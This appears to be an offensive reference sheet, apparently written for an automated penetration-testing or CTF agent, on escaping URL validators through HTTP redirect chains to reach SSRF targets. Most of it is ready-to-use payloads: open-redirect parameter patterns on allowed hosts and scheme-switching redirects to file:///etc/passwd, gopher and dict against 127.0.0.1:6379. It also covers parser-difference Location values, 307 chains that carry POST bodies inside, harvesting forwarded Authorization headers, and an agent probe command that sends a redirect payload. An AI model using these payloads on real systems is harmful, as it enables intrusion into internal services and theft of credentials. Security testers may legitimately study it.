# Redirect chains — the validate-then-follow escape

The filter approves the ENTRY url; the fetcher follows a redirect
to somewhere it never approved. Every hop after the first is
unvalidated — the chain is your path in.

---

## 1. The mechanism

```text
fetch("http://allowed.com/x")
  → validator: "allowed.com — pass"
  → fetcher: GET → 302 Location: http://127.0.0.1/admin
  → fetcher follows → GET http://127.0.0.1/admin
  → the second request was never checked
```

The precondition: the validator checks the INPUT url, not each
redirect-hop. Most validators check only the input — the follow-
redirect logic re-validates only in hardened fetchers.

## 2. The redirect-types — which follow

```text
301 Moved Permanently   — permanent — GET follows, POST→GET
302 Found               — the classic — GET follows, POST→GET
303 See Other           — forces GET — always follows to GET
307 Temporary           — preserves method+body — a POST stays POST
308 Permanent           — preserves method+body
meta-refresh            — <meta http-equiv=refresh> — html-level —
                          some fetchers (html-aware renderers) follow
js-location             — renderer-only — window.location=...
Location-relative       — Location: /admin — same-host redirect —
                          doesn't escape the allowed-host
Location-scheme         — Location: file:///etc/passwd — scheme-
                          change — gated by --proto-redir — usually
                          blocked, but when the fetcher allows it…
                          the escape is total
Location-relative-scheme — Location: //internal/x — protocol-
                          relative — host changes, scheme kept
```

## 3. The redirect-endpoints you control

```text
Your own listener:
  http://your-host/302.php?to=<target> — a stub that just sets
    Location — the simplest — you control every hop

Any open-redirect on an ALLOWED domain:
  http://allowed.com/redir?to=http://internal/
  http://allowed.com/redirect?url=http://internal/
  http://allowed.com/out?u=http://internal/
  http://allowed.com/link?target=http://internal/
  http://allowed.com/away?url=http://internal/
  http://allowed.com/goto?url=http://internal/
  http://allowed.com/track?dest=http://internal/
  http://allowed.com/leave?to=http://internal/
  http://allowed.com/exit?next=http://internal/
  http://allowed.com/r?url=http://internal/
  http://allowed.com/c?u=http://internal/
  → the app whitelists allowed.com → its open-redirect bounces
    you inside — NO infra needed — just an open-redirect ON the
    whitelisted host — find it by crawling or web-open-redirect
    skill
```

The open-redirect-on-allowed-domain is the cleanest — the whole
chain stays on the allowed host until the LAST hop.

## 4. The chain-length question

```text
fetcher limits: libcurl default 50-redirects; requests 30;
                most apps set 5-10 — a 10-hop chain is fine
each hop can re-check or not — hardened fetchers re-validate —
   the test: does hop-2 to a disallowed target still follow?
   → if yes, NO per-hop re-check → free rein
   → if no, the check IS per-hop → redirect can't help — pivot
```

## 5. The redirect-to-scheme trick

```text
302 → file:///etc/passwd          — libcurl needs --proto-redir to
                                     allow — default blocks scheme-
                                     change — but PHP-fetchers/java
                                     sometimes allow — and the
                                     REDIRECT is where the scheme-
                                     check dies — the validator
                                     checked "http://allowed" — the
                                     redirect adds "file://" never
                                     checked
302 → gopher://127.0.0.1:6379/_x    — same — when proto-redir allows
302 → dict://127.0.0.1:6379/INFO
302 → jar:file:///x!/y               — java
302 → ftp://internal/x
302 → ldap://internal/
```

`--proto-redir` — the curl flag for "which schemes may a redirect
switch to" — default is usually all-CURL-supported or a subset —
the test: does `http://your/302.php?to=file:///etc/passwd` read
the file? If yes → proto-redir allows file → everything opens.

## 6. The relative-redirect trap — stays on the host

```text
Location: /admin                  — same-host — doesn't escape —
                                    useful for hitting a DIFFERENT
                                    route on the allowed host —
                                    /admin on allowed.com — still
                                    internal-data if allowed.com
                                    IS the internal app
Location: //internal/x             — scheme-relative — host-changes
Location: ///internal/x            — triple-slash — parser-diff —
                                    some read as host, some as path
Location: /\internal                — backslash — curl treats \ as /
Location: http:/internal            — single-slash
Location: http:internal             — scheme-no-slashes — opaque
```

## 7. The javascript-redirect — renderer-only

```text
When the fetcher is a BROWSER (headless-chromium bot):
  <script>location='http://internal/x'</script>
  <meta http-equiv="refresh" content="0;url=http://internal/x">
  → the browser navigates — its OWN fetch-context — the bot's
    cookies/session ride along — not really "server-SSRF" — it's
    client-side navigation — different class boundary —
    see web-xss/bot-visit references
```

## 8. The 307/308-method-preserving chain

```text
POST http://allowed.com/x with a body
  → 307 Location: http://internal/endpoint
  → the fetcher re-sends the POST+body to internal
  → the body rides along — internal-POST with your data —
    state-changing internal actions via 307 — the write-channel
```

A 302 turns POST→GET (data lost); a 307/308 keeps method+body —
when you need to POST inside, the redirect must be 307/308.

## 9. The redirect + auth-forward trap

```text
Some fetchers forward headers across redirects:
  fetch("http://allowed.com/x") with Authorization: Bearer <internal>
  → 302 to internal → the Authorization may follow → internal-
    request carries the app's token → authenticated-internal!
libcurl: forwards auth to same-host only by default (unless
  CURLOPT_UNRESTRICTED_AUTH) — but custom fetchers forward
  blindly → the token leaks cross-origin → check the callback's
  headers — if your listener got an Authorization header on a
  redirected fetch, the app forwards auth — GOLD
```

The header-forward observation: the callback on a redirected
fetch shows what the app sends — an Authorization/Cookie/X-Token
header reaching your host means it forwards creds cross-origin.

## 10. The http_probe redirect-shape

```bash
# follow and observe the FINAL destination
python3 tools/web/http_probe.py --challenge "$C" --class web-ssrf \
  --url "$BASE/fetch" --method POST --body 'url=http://your/302.php?to=http://internal/admin' \
  --evidence-regex 'admin-panel|internal-content' --evidence-kind impact \
  --on-match confirms --on-miss inconclusive
```

The response that matters is the FINAL body — the redirect-chain
is invisible except through the content — check response-headers
too for the hop-trail.

## 11. The bounded-chain — when you need multiple hops

```text
validator → allowed.com → 302 → your-host → 302 → internal —
   each hop re-checks the host — your-host must ALSO pass — it
   doesn't → chain dies — UNLESS the re-check is weak — test
validator → allowed.com/redirect?u=... → internal —
   the app whitelists the PARAM not the host? — then the redirect
   via a param-shaped url bounces anywhere
```

The multi-hop chain breaks the moment ANY hop re-validates —
which is why single-hop redirect-via-allowed-open-redirect is the
workhorse: the app never sees the second destination.
